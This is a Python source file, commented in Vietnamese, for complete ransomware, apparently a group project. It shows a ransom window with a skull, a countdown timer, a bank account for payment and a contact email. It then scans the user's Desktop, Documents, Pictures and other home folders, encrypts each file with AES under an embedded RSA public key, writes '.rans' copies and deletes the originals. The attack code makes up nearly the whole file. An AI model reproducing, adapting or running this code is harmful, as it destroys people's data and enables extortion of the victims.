import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk
from tkinter import messagebox
from tkinter import ttk
import logging
from concurrent.futures import ThreadPoolExecutor

#===================================================================================================================
# Giao dien

# Thực hiện đếm ngược thời gian và cập nhật giao diện.
def countdown(count):
    hour, minute, second = map(int, count.split(':'))
    label['text'] = f'{hour:02}:{minute:02}:{second:02}'
    
    if hour > 0 or minute > 0 or second > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, f'{hour}:{minute}:{second}')

# Tạo cửa sổ giao diện chính của chương trình, đặt tiêu đề và nền.
root = tk.Tk()
root.title('Thông Báo Quang Trọng')
root.configure(bg='black')

# Tạo và đóng gói frame chính của giao diện người dùng.
main_frame = tk.Frame(root, bg='black')
main_frame.pack(expand=True)

# Thêm nhãn tiêu đề với thông báo khẩn cấp.
title_frame = tk.Frame(main_frame, bg="#34495E")
title_frame.pack(pady=20)

tk.Label(title_frame, text="THÔNG BÁO KHẨN CẤP", font=("Helvetica", 24, "bold"), fg="red").pack()

# Icon
skull_label = tk.Label(main_frame, text="☠", font=("Arial", 50), fg="white", bg="black")
skull_label.pack(pady=20)

# Thông báo 1.
notification_frame = tk.Frame(main_frame, bg="black")
notification_frame.pack(pady=10)

tk.Label(notification_frame, text="Tất cả các tệp của bạn đã bị mã hóa!", font=('Helvetica', 18, 'bold'), fg='red').pack()

# Thông báo 2.
message = """
Các tệp quan trọng của bạn, bao gồm tài liệu, ảnh, video, cơ sở dữ liệu và các tệp khác hiện không thể truy cập.
"""
message_label = tk.Label(notification_frame, text=message, font=("Arial", 12), fg="white", bg="#8B0000", justify="center", wraplength=650)
message_label.pack(pady=10)

# Thông báo 3.
instructions = """
Để khôi phục chúng, vui lòng gửi thanh toán vào tài khoản sau:\n\n
Tài khoản ngân hàng: VCB - 1234567890\n\n
Sau đó, gửi email cho chúng tôi với địa chỉ 'nhom4_ransomware@gmail.com' với ID giao dịch của bạn\n
"""
instructions_label = tk.Label(notification_frame, text=instructions, font=('calibri', 12), fg='yellow', bg='black', justify='center', wraplength=650)
instructions_label.pack(pady=5)

# Giao diện đồng hồ đếm ngược.
label = tk.Label(main_frame, font=('calibri', 40, 'bold'), fg='red', bg='black')
label.pack(pady=5)

# Thông báo 4.
warning_label = tk.Label(main_frame, 
                         text="Chú ý! Không đổi tên các tập tin được mã hóa.\n\n"
                              "Nỗ lực giải mã của bên thứ ba có thể dẫn đến mất dữ liệu vĩnh viễn.",
                         font=('calibri', 10, 'italic'), fg='red', bg='black', wraplength=650)
warning_label.pack(pady=5)

# Khởi tạo bộ đếm ngược bắt đầu từ 1 giờ 30 phút.
countdown('01:30:00')

#================================================================================================================
# Public key được mã hóa từ chuỗi base64.
PUB_KEY = base64.b64decode(
    '''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0r5IjHT2zoJsDnq1XrxYsabDObJBB5zDcWTvUVRNKyfSDvxgWGm4pFQS6wzPMxr4ounFtdQR72CDe935yEyr/1xeWNkNfFQF1HK75GiFHOXemhKPRiazItiI0Y/KdXArixfGkAhCk52IwUeXVSu5stfEtSy/lJL4sfEVj3a1+JS1UlUmzyzTr5UBdIB7QvAXIa01YDcKjgWSYgZppbAVHQDL2CSHzks6XBouh8M+R/iGQBR4sBBsQFVEZhi3ZhfgtM/wOgHlporkU+mOidpS4A52gEq6C/mCMgIxW1GeS/fvetVO/iM1Ra27scje32NXrcWE4SGjTbot114GwMIMsQIDAQAB
'''
)

# Cấu hình thư mục mục tiêu sẽ quét và file loại trừ khỏi quá trình mã hóa.
TARGET_DIRECTORIES = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Music"),
    os.path.expanduser("~/Videos")
]
EXCLUDED_EXTENSIONS = {'.py', '.exe'}
ENCRYPTED_LOG_FILE = "rans_log.txt"

# Danh sách file đã mã hóa.
original_files = []

# Duyệt qua thư mục và trả về danh sách các file.
def scan_recurse(base_dir):
    try:
        for entry in os.scandir(base_dir):
            if entry.is_file():
                yield entry.path
            elif entry.is_dir():
                yield from scan_recurse(entry.path)
    except (PermissionError, FileNotFoundError) as e:
        logging.warning(f"Không thể truy cập {base_dir}: {e}")

# Mã hóa file bằng RSA và AES.
def encrypt(data_file, public_key):
    # Kiểm tra phần mở rộng của tệp để bỏ qua những tệp không cần mã hóa.
    try:
        extension = data_file.suffix.lower()
        if extension in EXCLUDED_EXTENSIONS:
            return

        with open(data_file, 'rb') as f:
            data = f.read()

        # Khóa RSA và khóa phiên.
        key = RSA.import_key(public_key)
        session_key = os.urandom(16)
        rsa_cipher = PKCS1_OAEP.new(key)
        encrypted_session_key = rsa_cipher.encrypt(session_key)

        # Mã hóa AES.
        aes_cipher = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = aes_cipher.encrypt_and_digest(data)
        
        # Ghi dữ liệu đã mã hóa vào tệp mới.
        encrypted_file = f"{data_file}.rans"
        with open(encrypted_file, 'wb') as f:
            for item in (encrypted_session_key, aes_cipher.nonce, tag, ciphertext):
                f.write(item)

        os.remove(data_file)
        original_files.append(str(data_file))
        logging.info(f"Đã mã hóa: {data_file} -> {encrypted_file}")

    except Exception as e:
        logging.error(f"Lỗi khi mã hóa {data_file}: {e}")

# Duyệt qua các thư mục mục tiêu và mã hóa các tệp tìm thấy.
def process_directory(directory):
    if os.path.exists(directory):
        for file_path in scan_recurse(directory):
            encrypt(Path(file_path), PUB_KEY)

# Cấu hình logging.
logging.basicConfig(
    filename="rans_log.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    encoding="utf-8"
)

# Lưu danh sách các file đã mã hóa.
def save_encrypted_file_log():
    try:
        with open(ENCRYPTED_LOG_FILE, 'w', encoding='utf-8') as f:
            for file in original_files:
                f.write(file + '\n')
        logging.info(f"Danh sách file đã mã hóa được lưu vào: {ENCRYPTED_LOG_FILE}")
    except Exception as e:
        logging.error(f"Lỗi khi lưu danh sách file đã mã hóa: {e}")
        
#Đọc và hiển thị nội dung của tệp log trong một cửa sổ giao diện người dùng.
def show_log_gui():
    try:
        # Đọc nội dung tệp log
        with open("rans_log.txt", "r", encoding="utf-8") as f:
            log_content = f.read()
    except FileNotFoundError:
        log_content = "Không tìm thấy tệp log. Đảm bảo rằng quá trình mã hóa đã chạy thành công."

    # Tạo cửa sổ GUI
    window = tk.Tk()
    window.title("Danh sach FIle bi vo hieu hoa!!!!")
    window.geometry("800x600")

    # Thêm Text widget để hiển thị nội dung log
    text_area = tk.Text(window, wrap="word", font=("Arial", 12))
    text_area.insert("1.0", log_content)
    text_area.config(state="disabled")  # Chỉ đọc
    text_area.pack(fill="both", expand=True)

    # Nút Đóng
    ttk.Button(window, text="Đóng", command=window.destroy).pack(pady=10)

    # Hiển thị cửa sổ
    window.mainloop()

# Sử dụng đa luồng để xử lý nhiều thư mục đồng thời.
with ThreadPoolExecutor() as executor:
    executor.map(process_directory, TARGET_DIRECTORIES)

# Lưu log và hiển thị giao diện GUI
save_encrypted_file_log()
show_log_gui()

# Main loop
root.mainloop()
